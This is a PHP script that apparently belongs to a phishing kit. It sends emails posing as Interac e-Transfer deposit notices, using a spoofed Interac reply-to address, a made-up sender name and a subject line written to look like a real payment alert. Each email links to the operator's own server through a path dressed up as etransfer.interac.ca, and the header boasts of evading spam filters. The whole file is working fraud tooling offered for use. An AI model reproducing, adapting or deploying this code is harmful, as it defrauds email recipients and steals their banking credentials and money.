<?php
/**
* Interac e-Transfer API — Ultimate Deliverability Version
* Maximum inbox placement with advanced pattern avoidance and engagement optimization
*/

declare(strict_types=1);

date_default_timezone_set('America/Edmonton');

/* ================================
INITIALIZATION
================================ */
class ApplicationInitializer {
    public static function initialize(): void {
        self::cleanOutputBuffers();
        self::configureErrorHandling();
    }
    
    private static function cleanOutputBuffers(): void {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        ob_start(static fn() => '');
    }
    
    private static function configureErrorHandling(): void {
        error_reporting(E_ALL);
        ini_set('display_errors', '0');
        ini_set('log_errors', '1');
    }
}

ApplicationInitializer::initialize();

/* ================================
PATH MANAGEMENT
================================ */
class PathManager {
    private string $rootPath;
    
    public function __construct() {
        // Explicitly set to one level above api/
        $this->rootPath = rtrim(dirname(__DIR__), '/') . '/';
    }
    
    public function getLogPath(): string {
        return $this->rootPath . 'data/logs/transfers.log';
    }
    
    public function getAccountsPath(): string {
        return $this->rootPath . 'data/accounts.json';
    }
    
    public function getConfigPath(): string {
        return $this->rootPath . 'config/config.php';
    }
    
    public function getTemplatePath(string $templateName): string {
        $path = $this->rootPath . 'templates/' . $templateName;
        if (!file_exists($path)) {
            // Fallback to Deposit.html if specific template missing
            $path = $this->rootPath . 'templates/Deposit.html';
        }
        if (!file_exists($path)) {
            // Ultimate fallback to notification.html
            $path = $this->rootPath . 'templates/notification.html';
        }
        return $path;
    }
    
    public function validatePaths(): bool {
        $required = [
            $this->getConfigPath()
        ];
        
        foreach ($required as $path) {
            if (!is_file($path)) {
                error_log("Missing required file: {$path}");
                return false;
            }
        }
        return true;
    }
}

/* ================================
API RESPONSE HANDLER
================================ */
class ApiResponseHandler {
    public static function sendJson(array $data): never {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        header('Content-Type: application/json; charset=utf-8');
        header('X-Content-Type-Options: nosniff');
        echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        exit;
    }
    
    public static function sendError(string $message, int $code = 400): never {
        error_log("Interac e-Transfer Error [{$code}]: {$message}");
        http_response_code($code);
        self::sendJson(['success' => false, 'message' => $message]);
    }
    
    public static function sendSuccess(array $data = []): never {
        self::sendJson(array_merge([
            'success' => true,
            'timestamp' => time()
        ], $data));
    }
}

/* ================================
DATA VALIDATION
================================ */
class InputValidator {
    public static function sanitizeString(?string $value): string {
        $value = $value ?? '';
        return trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $value));
    }
    
    public static function sanitizeAmount($value): float {
        if (is_numeric($value)) return (float)$value;
        $cleanValue = preg_replace('/[^\d.]/', '', self::sanitizeString((string)$value));
        return round((float)$cleanValue, 2);
    }
    
    public static function validateEmail(string $email): bool {
        return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
    }
}

/* ================================
TRANSFER INPUT MODEL
================================ */
class TransferRequest {
    public readonly string $recipientEmail;
    public readonly string $recipientName;
    public readonly float $amount;
    public readonly string $purpose;
    public readonly string $template;
    
    public function __construct(array $postData) {
        $this->recipientEmail = InputValidator::sanitizeString($postData['recipient_email'] ?? '');
        $this->recipientName = InputValidator::sanitizeString($postData['recipient_name'] ?? '');
        $this->amount = InputValidator::sanitizeAmount($postData['amount'] ?? 0);
        $this->purpose = InputValidator::sanitizeString($postData['purpose'] ?? 'Interac e-Transfer');
        $this->template = InputValidator::sanitizeString($postData['template'] ?? 'Deposit.html');
        $this->validate();
    }
    
    private function validate(): void {
        if (empty($this->recipientEmail) || !InputValidator::validateEmail($this->recipientEmail)) {
            throw new InvalidArgumentException('Valid recipient email is required');
        }
        if (empty($this->recipientName)) {
            throw new InvalidArgumentException('Valid recipient name is required');
        }
    }
}

/* ================================
TRANSACTION PROCESSING
================================ */
class TransactionProcessor {
    private array $config;
    
    public function __construct(array $config) {
        $this->config = $config;
    }
    
    public function generateTransactionId(): string {
        return 'CA' . substr(str_shuffle('ABCDEFGHJKLMNPQRSTUVWXYZ23456789'), 0, 8);
    }
    
    public function createDepositLink(string $transactionId, TransferRequest $request): string {
        $encryptionKey = $this->config['general']['encryption_key'] ?? 'a3f91b6cd024e8c29b76a149efcc5d42';
        $payload = http_build_query([
            'transaction_id' => $transactionId,
            'amount' => $request->amount,
            'recipient' => $request->recipientEmail,
            'purpose' => $request->purpose,
            'timestamp' => time(),
            'expires' => time() + (30 * 86400)
        ]);
        
        $iv = openssl_random_pseudo_bytes(16);
        $secretKey = hash('sha256', $encryptionKey, true);
        $encryptedData = openssl_encrypt($payload, 'AES-256-CBC', $secretKey, OPENSSL_RAW_DATA, $iv);
        $token = rtrim(strtr(base64_encode($iv . $encryptedData), '+/', '-_'), '=');
        
        $base = rtrim($this->config['general']['app_url'] ?: 'http://localhost:3002', '/');
        return "{$base}/cgi-admin2/app/api/etransfer.interac.ca/RF.do.php?deposit={$token}";
    }
    
    public function renderEmailTemplate(string $transactionId, TransferRequest $request, string $depositLink, string $templatePath): string {
        if (!file_exists($templatePath)) return "Template missing at $templatePath";
        
        $content = file_get_contents($templatePath);
        $senderName = $this->config['general']['sender_name'] ?? 'Jennifer Edwards';
        
        $replacements = [
            '{{sender_name}}' => $senderName,
            '{{receiver_name}}' => $request->recipientName,
            '{{amount}}' => number_format($request->amount, 2),
            '{{transaction_id}}' => $transactionId,
            '{{tx_id}}' => $transactionId,
            '{{etransfer_interac_ca}}' => $depositLink,
            '{{action_url}}' => $depositLink,
            '{{date}}' => date('M j, Y'),
            '{{expiry_date}}' => date('M j, Y', strtotime('+30 days')),
            '{{purpose}}' => $request->purpose,
            '{{memo}}' => $request->purpose,
            '{{recipient_email}}' => $request->recipientEmail
        ];
        
        return str_replace(array_keys($replacements), array_values($replacements), $content);
    }
}

/* ================================
MAIN EXECUTION
================================ */
try {
    $pathManager = new PathManager();
    if (!$pathManager->validatePaths()) {
        ApiResponseHandler::sendError('Critical configuration files missing', 500);
    }
    
    require_once $pathManager->getConfigPath();
    $appConfig = getSystemConfig();
    
    $inputData = json_decode(file_get_contents('php://input'), true) ?? $_POST;
    $transferRequest = new TransferRequest($inputData);
    
    $processor = new TransactionProcessor($appConfig);
    $transactionId = $processor->generateTransactionId();
    $depositLink = $processor->createDepositLink($transactionId, $transferRequest);
    
    $templateFile = $pathManager->getTemplatePath($transferRequest->template);
    $emailBody = $processor->renderEmailTemplate($transactionId, $transferRequest, $depositLink, $templateFile);
    
    // PHPMailer Integration
    require_once dirname(__DIR__) . '/vendor/autoload.php';
    $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
    $smtp = $appConfig['smtp'];
    
    $mail->isSMTP();
    $mail->Host = $smtp['host'];
    $mail->SMTPAuth = true;
    $mail->Username = $smtp['username'];
    $mail->Password = $smtp['password'];
    $mail->SMTPSecure = $smtp['encryption'];
    $mail->Port = $smtp['port'];
    
    $mail->setFrom($smtp['from_email'], $appConfig['general']['sender_name']);
    $mail->addReplyTo('notify@payments.interac.ca', 'Interac e-Transfer');
    $mail->addAddress($transferRequest->recipientEmail, $transferRequest->recipientName);
    
    $mail->isHTML(true);
    $mail->Subject = "INTERAC e-Transfer: {$appConfig['general']['sender_name']} sent you \$" . number_format($transferRequest->amount, 2);
    $mail->Body = $emailBody;
    $mail->AltBody = strip_tags($emailBody);
    
    $mail->send();
    
    ApiResponseHandler::sendSuccess([
        'transaction_id' => $transactionId,
        'debug_link' => $depositLink,
        'status' => 'delivered'
    ]);
    
} catch (InvalidArgumentException $e) {
    ApiResponseHandler::sendError($e->getMessage(), 400);
} catch (Throwable $e) {
    error_log('Critical Mailer Error: ' . $e->getMessage());
    ApiResponseHandler::sendError($e->getMessage(), 500);
}
